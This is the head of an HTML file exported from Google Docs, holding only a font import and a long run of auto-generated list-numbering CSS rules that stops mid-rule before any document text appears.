<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=5XG6OVxjD8asKTY1ZA2oX7Rm4tLGl6OUZz8OC2nun1jEp5AgfeuqMj0aPVDtZvdzfRIvrrn7ezy4n1Qsosw3zg');.lst-kix_cc5tud1vde9p-1>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-1}.lst-kix_d90m61m618oa-5>li{counter-increment:lst-ctn-kix_d90m61m618oa-5}.lst-kix_j6urpnclzr2v-0>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-0}ol.lst-kix_afphhjvhkxq-0.start{counter-reset:lst-ctn-kix_afphhjvhkxq-0 0}.lst-kix_4odmxee0jpwg-8>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-8}ol.lst-kix_4odmxee0jpwg-7{list-style-type:none}ol.lst-kix_cc5tud1vde9p-7{list-style-type:none}ol.lst-kix_4odmxee0jpwg-8{list-style-type:none}ol.lst-kix_cc5tud1vde9p-6{list-style-type:none}.lst-kix_3suwmg6ak374-5>li{counter-increment:lst-ctn-kix_3suwmg6ak374-5}ol.lst-kix_4odmxee0jpwg-5{list-style-type:none}ol.lst-kix_cc5tud1vde9p-5{list-style-type:none}ol.lst-kix_4odmxee0jpwg-6{list-style-type:none}ol.lst-kix_cc5tud1vde9p-4{list-style-type:none}.lst-kix_j6urpnclzr2v-2>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-2}.lst-kix_d90m61m618oa-3>li{counter-increment:lst-ctn-kix_d90m61m618oa-3}.lst-kix_7jxhi2va7kgl-1>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-1}ol.lst-kix_cc5tud1vde9p-8{list-style-type:none}ol.lst-kix_j6urpnclzr2v-5.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-5 0}ol.lst-kix_cc5tud1vde9p-3{list-style-type:none}ol.lst-kix_cc5tud1vde9p-2{list-style-type:none}ol.lst-kix_cc5tud1vde9p-1{list-style-type:none}ol.lst-kix_cc5tud1vde9p-0{list-style-type:none}.lst-kix_afphhjvhkxq-7>li{counter-increment:lst-ctn-kix_afphhjvhkxq-7}ol.lst-kix_7jxhi2va7kgl-2.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-2 0}ol.lst-kix_7jxhi2va7kgl-8.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-8 0}ol.lst-kix_3suwmg6ak374-5.start{counter-reset:lst-ctn-kix_3suwmg6ak374-5 0}.lst-kix_4odmxee0jpwg-6>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-6}ol.lst-kix_4odmxee0jpwg-0{list-style-type:none}ol.lst-kix_4odmxee0jpwg-3{list-style-type:none}ol.lst-kix_4odmxee0jpwg-8.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-8 0}ol.lst-kix_4odmxee0jpwg-4{list-style-type:none}ol.lst-kix_4odmxee0jpwg-1{list-style-type:none}ol.lst-kix_3cbw9prsclrp-5.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-5 0}ol.lst-kix_4odmxee0jpwg-2{list-style-type:none}.lst-kix_3cbw9prsclrp-0>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-0}.lst-kix_7jxhi2va7kgl-5>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-5}ol.lst-kix_d90m61m618oa-2.start{counter-reset:lst-ctn-kix_d90m61m618oa-2 0}ol.lst-kix_d90m61m618oa-6.start{counter-reset:lst-ctn-kix_d90m61m618oa-6 0}.lst-kix_d90m61m618oa-1>li{counter-increment:lst-ctn-kix_d90m61m618oa-1}ol.lst-kix_3suwmg6ak374-6.start{counter-reset:lst-ctn-kix_3suwmg6ak374-6 0}ol.lst-kix_cc5tud1vde9p-4.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-4 0}ol.lst-kix_3suwmg6ak374-1{list-style-type:none}ol.lst-kix_3suwmg6ak374-2{list-style-type:none}.lst-kix_d90m61m618oa-7>li{counter-increment:lst-ctn-kix_d90m61m618oa-7}ol.lst-kix_3cbw9prsclrp-4.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-4 0}ol.lst-kix_3suwmg6ak374-0{list-style-type:none}ol.lst-kix_3suwmg6ak374-5{list-style-type:none}.lst-kix_cc5tud1vde9p-3>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-3}ol.lst-kix_afphhjvhkxq-5.start{counter-reset:lst-ctn-kix_afphhjvhkxq-5 0}ol.lst-kix_3suwmg6ak374-6{list-style-type:none}ol.lst-kix_3suwmg6ak374-3{list-style-type:none}ol.lst-kix_3suwmg6ak374-4{list-style-type:none}ol.lst-kix_3suwmg6ak374-7{list-style-type:none}ol.lst-kix_3suwmg6ak374-8{list-style-type:none}ol.lst-kix_j6urpnclzr2v-0.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-0 0}.lst-kix_3cbw9prsclrp-7>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-7}.lst-kix_afphhjvhkxq-2>li{counter-increment:lst-ctn-kix_afphhjvhkxq-2}ol.lst-kix_cc5tud1vde9p-5.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-5 0}.lst-kix_afphhjvhkxq-5>li{counter-increment:lst-ctn-kix_afphhjvhkxq-5}ol.lst-kix_d90m61m618oa-1.start{counter-reset:lst-ctn-kix_d90m61m618oa-1 0}ol.lst-kix_d90m61m618oa-7.start{counter-reset:lst-ctn-kix_d90m61m618oa-7 0}ol.lst-kix_7jxhi2va7kgl-3.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-3 0}.lst-kix_3suwmg6ak374-7>li{counter-increment:lst-ctn-kix_3suwmg6ak374-7}.lst-kix_3suwmg6ak374-1>li{counter-increment:lst-ctn-kix_3suwmg6ak374-1}ol.lst-kix_afphhjvhkxq-6.start{counter-reset:lst-ctn-kix_afphhjvhkxq-6 0}ol.lst-kix_3suwmg6ak374-0.start{counter-reset:lst-ctn-kix_3suwmg6ak374-0 0}ol.lst-kix_j6urpnclzr2v-6.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-6 0}.lst-kix_j6urpnclzr2v-4>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-4,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-7{list-style-type:none}.lst-kix_cc5tud1vde9p-7>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-7}ol.lst-kix_j6urpnclzr2v-8{list-style-type:none}.lst-kix_4odmxee0jpwg-2>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-2}ol.lst-kix_afphhjvhkxq-4.start{counter-reset:lst-ctn-kix_afphhjvhkxq-4 0}.lst-kix_afphhjvhkxq-5>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-5,lower-roman) ". "}.lst-kix_afphhjvhkxq-7>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-7,lower-latin) ". "}.lst-kix_j6urpnclzr2v-2>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-2,lower-roman) ". "}ol.lst-kix_j6urpnclzr2v-3{list-style-type:none}.lst-kix_j6urpnclzr2v-6>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-6,decimal) ". "}ol.lst-kix_cc5tud1vde9p-6.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-6 0}ol.lst-kix_j6urpnclzr2v-4{list-style-type:none}ol.lst-kix_j6urpnclzr2v-5{list-style-type:none}ol.lst-kix_j6urpnclzr2v-6{list-style-type:none}.lst-kix_j6urpnclzr2v-0>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-0,decimal) ". "}.lst-kix_j6urpnclzr2v-8>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-8,lower-roman) ". "}ol.lst-kix_j6urpnclzr2v-0{list-style-type:none}ol.lst-kix_j6urpnclzr2v-1{list-style-type:none}.lst-kix_afphhjvhkxq-1>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-1,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-2{list-style-type:none}.lst-kix_4odmxee0jpwg-0>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-0,decimal) ". "}.lst-kix_4odmxee0jpwg-2>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-2,lower-roman) ". "}ol.lst-kix_4odmxee0jpwg-7.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-7 0}.lst-kix_cc5tud1vde9p-4>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-4,lower-latin) ". "}.lst-kix_4odmxee0jpwg-1>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-1}ol.lst-kix_3cbw9prsclrp-6.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-6 0}ol.lst-kix_3cbw9prsclrp-7{list-style-type:none}.lst-kix_4odmxee0jpwg-4>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-4,lower-latin) ". "}.lst-kix_3cbw9prsclrp-4>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-4}ol.lst-kix_3cbw9prsclrp-8{list-style-type:none}ol.lst-kix_3cbw9prsclrp-5{list-style-type:none}ol.lst-kix_3cbw9prsclrp-6{list-style-type:none}.lst-kix_7jxhi2va7kgl-8>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-8}ol.lst-kix_3cbw9prsclrp-3{list-style-type:none}.lst-kix_cc5tud1vde9p-2>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-2,lower-roman) ". "}ol.lst-kix_3cbw9prsclrp-4{list-style-type:none}.lst-kix_3suwmg6ak374-2>li{counter-increment:lst-ctn-kix_3suwmg6ak374-2}.lst-kix_dokz9fyws9pt-1>li:before{content:"\0025cb  "}ol.lst-kix_d90m61m618oa-3.start{counter-reset:lst-ctn-kix_d90m61m618oa-3 0}.lst-kix_3cbw9prsclrp-0>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-0,decimal) ". "}.lst-kix_3cbw9prsclrp-4>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-4,lower-latin) ". "}.lst-kix_cc5tud1vde9p-0>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-0,decimal) ". "}ol.lst-kix_j6urpnclzr2v-7.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-7 0}ol.lst-kix_d90m61m618oa-5.start{counter-reset:lst-ctn-kix_d90m61m618oa-5 0}.lst-kix_452ui7xkw1cj-1>li:before{content:"\0025cb  "}.lst-kix_dokz9fyws9pt-3>li:before{content:"\0025cf  "}.lst-kix_dokz9fyws9pt-5>li:before{content:"\0025a0  "}.lst-kix_3cbw9prsclrp-2>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-2,lower-roman) ". "}.lst-kix_j6urpnclzr2v-5>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-5}.lst-kix_d90m61m618oa-0>li{counter-increment:lst-ctn-kix_d90m61m618oa-0}.lst-kix_3suwmg6ak374-4>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-4,lower-latin) ". "}.lst-kix_dokz9fyws9pt-7>li:before{content:"\0025cb  "}.lst-kix_3suwmg6ak374-6>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-6,decimal) ". "}.lst-kix_3suwmg6ak374-8>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-8,lower-roman) ". "}.lst-kix_4odmxee0jpwg-0>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-0}.lst-kix_afphhjvhkxq-3>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-3,decimal) ". "}.lst-kix_afphhjvhkxq-1>li{counter-increment:lst-ctn-kix_afphhjvhkxq-1}ol.lst-kix_afphhjvhkxq-1.start{counter-reset:lst-ctn-kix_afphhjvhkxq-1 0}ol.lst-kix_d90m61m618oa-3{list-style-type:none}ol.lst-kix_d90m61m618oa-2{list-style-type:none}ol.lst-kix_d90m61m618oa-1{list-style-type:none}ol.lst-kix_3cbw9prsclrp-8.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-8 0}ol.lst-kix_d90m61m618oa-0{list-style-type:none}ol.lst-kix_d90m61m618oa-7{list-style-type:none}ol.lst-kix_d90m61m618oa-6{list-style-type:none}ol.lst-kix_d90m61m618oa-5{list-style-type:none}ol.lst-kix_d90m61m618oa-4{list-style-type:none}ol.lst-kix_cc5tud1vde9p-8.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-8 0}.lst-kix_3suwmg6ak374-3>li{counter-increment:lst-ctn-kix_3suwmg6ak374-3}.lst-kix_452ui7xkw1cj-7>li:before{content:"\0025cb  "}.lst-kix_afphhjvhkxq-0>li{counter-increment:lst-ctn-kix_afphhjvhkxq-0}ol.lst-kix_7jxhi2va7kgl-7.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-7 0}.lst-kix_452ui7xkw1cj-5>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-2>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-2,lower-roman) ". "}.lst-kix_3cbw9prsclrp-8>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-8,lower-roman) ". "}ol.lst-kix_afphhjvhkxq-2.start{counter-reset:lst-ctn-kix_afphhjvhkxq-2 0}.lst-kix_afphhjvhkxq-6>li{counter-increment:lst-ctn-kix_afphhjvhkxq-6}.lst-kix_3suwmg6ak374-0>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-0,decimal) ". "}ol.lst-kix_d90m61m618oa-8{list-style-type:none}.lst-kix_452ui7xkw1cj-3>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-7.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-7 0}.lst-kix_3cbw9prsclrp-6>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-6,decimal) ". "}ol.lst-kix_afphhjvhkxq-3.start{counter-reset:lst-ctn-kix_afphhjvhkxq-3 0}.lst-kix_4odmxee0jpwg-8>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-8,lower-roman) ". "}ol.lst-kix_7jxhi2va7kgl-6.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-6 0}.lst-kix_4odmxee0jpwg-6>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-6,decimal) ". "}ol.lst-kix_3cbw9prsclrp-7.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-7 0}.lst-kix_3cbw9prsclrp-5>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-5}.lst-kix_4odmxee0jpwg-7>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-7}.lst-kix_cc5tud1vde9p-6>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-6,decimal) ". "}.lst-kix_7jxhi2va7kgl-3>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-3}.lst-kix_cc5tud1vde9p-2>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-2}ul.lst-kix_452ui7xkw1cj-1{list-style-type:none}ul.lst-kix_452ui7xkw1cj-2{list-style-type:none}.lst-kix_cc5tud1vde9p-8>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-8,lower-roman) ". "}ul.lst-kix_452ui7xkw1cj-0{list-style-type:none}ul.lst-kix_452ui7xkw1cj-5{list-style-type:none}.lst-kix_j6urpnclzr2v-4>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-4}ul.lst-kix_452ui7xkw1cj-6{list-style-type:none}ul.lst-kix_452ui7xkw1cj-3{list-style-type:none}ul.lst-kix_452ui7xkw1cj-4{list-style-type:none}.lst-kix_cc5tud1vde9p-8>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-8}ul.lst-kix_452ui7xkw1cj-7{list-style-type:none}ul.lst-kix_452ui7xkw1cj-8{list-style-type:none}ol.lst-kix_d90m61m618oa-4.start{counter-reset:lst-ctn-kix_d90m61m618oa-4 0}.lst-kix_d90m61m618oa-3>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-3,decimal) ". "}.lst-kix_d90m61m618oa-5>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-5,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-2>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-2}.lst-kix_d90m61m618oa-0>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-0,decimal) ". "}.lst-kix_d90m61m618oa-4>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-4,lower-latin) ". "}.lst-kix_d90m61m618oa-7>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-7,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-8.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-8 0}.lst-kix_d90m61m618oa-6>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-6,decimal) ". "}.lst-kix_3cbw9prsclrp-8>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-8}.lst-kix_d90m61m618oa-8>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-8,lower-roman) ". "}ol.lst-kix_cc5tud1vde9p-2.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-2 0}.lst-kix_3suwmg6ak374-6>li{counter-increment:lst-ctn-kix_3suwmg6ak374-6}.lst-kix_cc5tud1vde9p-0>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-0}.lst-kix_d90m61m618oa-4>li{counter-increment:lst-ctn-kix_d90m61m618oa-4}ol.lst-kix_3cbw9prsclrp-2.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-2 0}.lst-kix_d90m61m618oa-6>li{counter-increment:lst-ctn-kix_d90m61m618oa-6}ol.lst-kix_3suwmg6ak374-2.start{counter-reset:lst-ctn-kix_3suwmg6ak374-2 0}ol.lst-kix_afphhjvhkxq-8.start{counter-reset:lst-ctn-kix_afphhjvhkxq-8 0}.lst-kix_3suwmg6ak374-8>li{counter-increment:lst-ctn-kix_3suwmg6ak374-8}.lst-kix_7jxhi2va7kgl-4>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-4}ol.lst-kix_3suwmg6ak374-8.start{counter-reset:lst-ctn-kix_3suwmg6ak374-8 0}.lst-kix_d90m61m618oa-1>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-1,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-5.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-5 0}.lst-kix_3cbw9prsclrp-6>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-6}.lst-kix_d90m61m618oa-2>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-2,lower-roman) ". "}.lst-kix_cc5tud1vde9p-4>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-4}.lst-kix_4odmxee0jpwg-5>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-5}.lst-kix_7jxhi2va7kgl-0>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-0,decimal) ". "}ol.lst-kix_4odmxee0jpwg-5.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-5 0}.lst-kix_7jxhi2va7kgl-1>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-1,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-2>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-2,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-3>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-3,decimal) ". "}.lst-kix_7jxhi2va7kgl-4>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-4,lower-latin) ". "}ol.lst-kix_3suwmg6ak374-7.start{counter-reset:lst-ctn-kix_3suwmg6ak374-7 0}.lst-kix_j6urpnclzr2v-3>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-3}ol.lst-kix_7jxhi2va7kgl-4.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-4 0}.lst-kix_7jxhi2va7kgl-7>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-5>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-5,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-6>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-6,decimal) ". "}.lst-kix_3cbw9prsclrp-1>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-1}ol.lst-kix_3cbw9prsclrp-1{list-style-type:none}ul.lst-kix_dokz9fyws9pt-8{list-style-type:none}ol.lst-kix_3cbw9prsclrp-2{list-style-type:none}ul.lst-kix_dokz9fyws9pt-7{list-style-type:none}ul.lst-kix_dokz9fyws9pt-6{list-style-type:none}ol.lst-kix_3cbw9prsclrp-0{list-style-type:none}ul.lst-kix_dokz9fyws9pt-5{list-style-type:none}ul.lst-kix_dokz9fyws9pt-4{list-style-type:none}ul.lst-kix_dokz9fyws9pt-3{list-style-type:none}ul.lst-kix_dokz9fyws9pt-2{list-style-type:none}.lst-kix_7jxhi2va7kgl-8>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-8,lower-roman) ". "}ol.lst-kix_4odmxee0jpwg-6.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-6 0}.lst-kix_afphhjvhkxq-8>li{counter-increment:lst-ctn-kix_afphhjvhkxq-8}ol.lst-kix_4odmxee0jpwg-0.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-0 0}ul.lst-kix_dokz9fyws9pt-1{list-style-type:none}ul.lst-kix_dokz9fyws9pt-0{list-style-type:none}.lst-kix_3suwmg6ak374-4>li{counter-increment:lst-ctn-kix_3suwmg6ak374-4}.lst-kix_j6urpnclzr2v-3>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-3,decimal) ". "}.lst-kix_j6urpnclzr2v-5>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-5,lower-roman) ". "}.lst-kix_3cbw9prsclrp-3>li{counter-increment:lst-ctn-kix_3cbw9prsclrp-3}.lst-kix_afphhjvhkxq-2>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-2,lower-roman) ". "}.lst-kix_afphhjvhkxq-6>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-6,decimal) ". "}ol.lst-kix_7jxhi2va7kgl-5{list-style-type:none}ol.lst-kix_3cbw9prsclrp-3.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-3 0}ol.lst-kix_7jxhi2va7kgl-6{list-style-type:none}.lst-kix_afphhjvhkxq-3>li{counter-increment:lst-ctn-kix_afphhjvhkxq-3}ol.lst-kix_7jxhi2va7kgl-3{list-style-type:none}.lst-kix_j6urpnclzr2v-1>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-7>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-7,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-4{list-style-type:none}.lst-kix_3suwmg6ak374-0>li{counter-increment:lst-ctn-kix_3suwmg6ak374-0}ol.lst-kix_7jxhi2va7kgl-1{list-style-type:none}ol.lst-kix_7jxhi2va7kgl-2{list-style-type:none}ol.lst-kix_j6urpnclzr2v-4.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-4 0}ol.lst-kix_7jxhi2va7kgl-0{list-style-type:none}.lst-kix_afphhjvhkxq-0>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-0,decimal) ". "}.lst-kix_afphhjvhkxq-8>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-8,lower-roman) ". "}.lst-kix_4odmxee0jpwg-1>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-1,lower-latin) ". "}ol.lst-kix_afphhjvhkxq-7.start{counter-reset:lst-ctn-kix_afphhjvhkxq-7 0}ol.lst-kix_7jxhi2va7kgl-7{list-style-type:none}ol.lst-kix_3suwmg6ak374-1.start{counter-reset:lst-ctn-kix_3suwmg6ak374-1 0}ol.lst-kix_7jxhi2va7kgl-8{list-style-type:none}.lst-kix_4odmxee0jpwg-5>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-5,lower-roman) ". "}.lst-kix_cc5tud1vde9p-3>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-3,decimal) ". "}.lst-kix_cc5tud1vde9p-6>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-6}ol.lst-kix_7jxhi2va7kgl-1.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-1 0}ol.lst-kix_d90m61m618oa-0.start{counter-reset:lst-ctn-kix_d90m61m618oa-0 0}.lst-kix_4odmxee0jpwg-3>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-3,decimal) ". "}.lst-kix_cc5tud1vde9p-1>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-6>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-6}ol.lst-kix_d90m61m618oa-8.start{counter-reset:lst-ctn-kix_d90m61m618oa-8 0}.lst-kix_3cbw9prsclrp-1>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-8>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-8}ol.lst-kix_4odmxee0jpwg-4.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-4 0}.lst-kix_dokz9fyws9pt-2>li:before{content:"\0025a0  "}.lst-kix_7jxhi2va7kgl-7>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-7}.lst-kix_dokz9fyws9pt-4>li:before{content:"\0025cb  "}.lst-kix_3cbw9prsclrp-3>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-3,decimal) ". "}.lst-kix_452ui7xkw1cj-0>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-0.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-0 0}ol.lst-kix_4odmxee0jpwg-1.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-1 0}.lst-kix_dokz9fyws9pt-8>li:before{content:"\0025a0  "}ol.lst-kix_cc5tud1vde9p-3.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-3 0}.lst-kix_3suwmg6ak374-5>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-5,lower-roman) ". "}.lst-kix_dokz9fyws9pt-6>li:before{content:"\0025cf  "}.lst-kix_3suwmg6ak374-7>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-7,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-1.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-1 0}.lst-kix_afphhjvhkxq-4>li{counter-increment:lst-ctn-kix_afphhjvhkxq-4}.lst-kix_4odmxee0jpwg-3>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-3}.lst-kix_afphhjvhkxq-4>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-4,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-0.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-0 0}ol.lst-kix_3cbw9prsclrp-1.start{counter-reset:lst-ctn-kix_3cbw9prsclrp-1 0}ol.lst-kix_3suwmg6ak374-3.start{counter-reset:lst-ctn-kix_3suwmg6ak374-3 0}ol.lst-kix_cc5tud1vde9p-1.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-1 0}.lst-kix_d90m61m618oa-2>li{counter-increment:lst-ctn-kix_d90m61m618oa-2}.lst-kix_d90m61m618oa-8>li{counter-increment:lst-ctn-kix_d90m61m618oa-8}.lst-kix_452ui7xkw1cj-8>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-3>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-3,decimal) ". "}.lst-kix_452ui7xkw1cj-6>li:before{content:"\0025cf  "}.lst-kix_4odmxee0jpwg-4>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-4}.lst-kix_3suwmg6ak374-1>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-1,lower-latin) ". "}ol.lst-kix_4odmxee0jpwg-2.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-2 0}ol.lst-kix_afphhjvhkxq-8{list-style-type:none}.lst-kix_3cbw9prsclrp-5>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-5,lower-roman) ". "}ol.lst-kix_afphhjvhkxq-7{list-style-type:none}.lst-kix_452ui7xkw1cj-2>li:before{content:"\0025a0  "}ol.lst-kix_afphhjvhkxq-6{list-style-type:none}ol.lst-kix_afphhjvhkxq-5{list-style-type:none}ol.lst-kix_afphhjvhkxq-4{list-style-type:none}.lst-kix_3cbw9prsclrp-7>li:before{content:"" counter(lst-ctn-kix_3cbw9prsclrp-7,lower-latin) ". "}ol.lst-kix_afphhjvhkxq-3{list-style-type:none}ol.lst-kix_j6urpnclzr2v-2.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-2 0}.lst-kix_452ui7xkw1cj-4>li:before{content:"\0025cb  "}ol.lst-kix_afphhjvhkxq-2{list-style-type:none}ol.lst-kix_afphhjvhkxq-1{list-style-type:none}ol.lst-kix_afphhjvhkxq-0{list-style-type:none}.lst-kix_dokz9fyws9pt-0>li:before{content:"\0025cf  "}ol.lst-kix_3suwmg6ak374-4.start{counter-reset:lst-ctn-kix_3suwmg6ak374-4 0}.lst-kix_4odmxee0jpwg-7>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-7,lower-latin) ". "}.lst-kix_cc5tud1vde9p-5>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-5,lower-roman) ". 